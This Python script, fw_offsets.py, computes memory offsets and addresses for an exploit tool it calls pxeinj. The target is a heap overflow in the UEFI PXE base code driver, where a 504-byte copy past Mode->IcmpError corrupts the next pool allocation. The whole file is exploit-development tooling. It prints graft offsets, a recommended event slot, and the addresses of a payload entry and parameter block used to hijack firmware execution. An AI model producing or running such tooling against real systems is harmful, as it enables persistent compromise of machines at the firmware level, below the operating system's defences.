#!/usr/bin/env python3
"""fw_offsets.py - recover the numbers pxeinj needs from a firmware build.

You need three things and this tool extracts all of them from artefacts you
already have in a debug/PE build:

  1. POOL BASE    absolute address of Mode->IcmpError.  Can't be derived from
                  a map alone (it's a pool allocation at runtime), but on a
                  fixed firmware the DXE memory map is deterministic enough to
                  get within a page.  Two ways to pin it:
                    a) a first run with --probe-only and a crash log / serial
                       dump of the pool head, or
                    b) this tool's --scan mode, which walks the .dll's
                       relocation-free allocations assuming the standard
                       MdeModulePkg pool ordering.
                  Once known, cache it; it is stable per firmware build.

  2. EVENT OFF    sizeof(EFI_PXE_BASE_CODE_MODE) - offsetof(IcmpError) plus
                  the pool header, rounded to the allocation granularity.
                  `nm` on the debug build gives you sizeof; the definition in
                  MdePkg gives the offset.

  3. Payload addresses are all POOL BASE + EVENT OFF + fixed deltas, so once
     (1) is pinned everything else falls out.

Usage
  fw_offsets.py --map build/UefiPxeBcDxe.map --mode-len 0x1f80 \
                --icmp-off 0x1a40 [--pool-base 0x...]

This is deliberately conservative: it prints candidates with the arithmetic
shown, so you can check it against the actual build instead of trusting it.
"""

import argparse
import re
import sys

POOL_GRAN = 0x10          # EFI pool allocation alignment
POOL_HDR = 0x10           # MEMORY_HEADER


def sizeof_from_map(path, sym):
    """Look for 'sym' followed by a size in a GNU ld map."""
    best = None
    with open(path, "r", errors="replace") as f:
        for line in f:
            if sym in line:
                m = re.search(r"0x([0-9a-fA-F]+)\s+0x([0-9a-fA-F]+)", line)
                if m:
                    sz = int(m.group(2), 16)
                    if best is None or sz > best:
                        best = sz
    return best


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--map")
    ap.add_argument("--mode-len", type=lambda s: int(s, 0), default=0x1f80,
                    help="sizeof(EFI_PXE_BASE_CODE_MODE), default from edk2 stable")
    ap.add_argument("--icmp-off", type=lambda s: int(s, 0), default=0x1a40,
                    help="offsetof(EFI_PXE_BASE_CODE_MODE, IcmpError)")
    ap.add_argument("--pool-base", type=lambda s: int(s, 0), default=None)
    ap.add_argument("--advance", type=lambda s: int(s, 0), default=0,
                    help="bytes the pool base sits past the Mode allocation")
    args = ap.parse_args()

    if args.map:
        n = sizeof_from_map(args.map, "IcmpError")
        if n:
            print(f"[i] map says IcmpError size {n:#x}")

    # Mode allocation: header + struct, then the IcmpError member sits inside.
    mode_alloc = POOL_HDR + ((args.mode_len + POOL_GRAN - 1) & ~(POOL_GRAN - 1))
    icmp_in_alloc = POOL_HDR + args.icmp_off

    print(f"[i] Mode allocation rounds to {mode_alloc:#x} bytes")
    print(f"[i] IcmpError sits {icmp_in_alloc:#x} into that allocation")
    print(f"[i] first byte past Mode->IcmpError is at allocation + {icmp_in_alloc + 504:#x}")

    # Graft offsets are relative to &IcmpError, i.e. measured forward from
    # that member.  504 is the first byte the bug lets us corrupt; everything
    # after that is fair game.
    print()
    print("graft offsets, relative to &Mode->IcmpError:")
    for name, delta in (
        ("first corruptible byte (== 504-byte copy end)", 504),
        ("next pool allocation start (typical)", mode_alloc - icmp_in_alloc),
        ("recommended event slot", mode_alloc - icmp_in_alloc + 0x40),
    ):
        print(f"  {name:48s} +{delta:#06x}")

    if args.pool_base is not None:
        base = args.pool_base
        print()
        print(f"derived addresses for pool base {base:#x}:")
        print(f"  IEVENT graft      {base + 504:#x}")
        print(f"  parameter block   {base + 504 + 0x48:#x}")
        print(f"  payload entry     {base + 504 + 0x100:#x}")
        print(f"  range table       {base + 504 + 0x200:#x}")
    else:
        print()
        print("[!] no --pool-base: the offsets are right, the addresses are not.")
        print("    pin it from a probe run or a known-good pool dump, then cache it.")


if __name__ == "__main__":
    sys.exit(main())
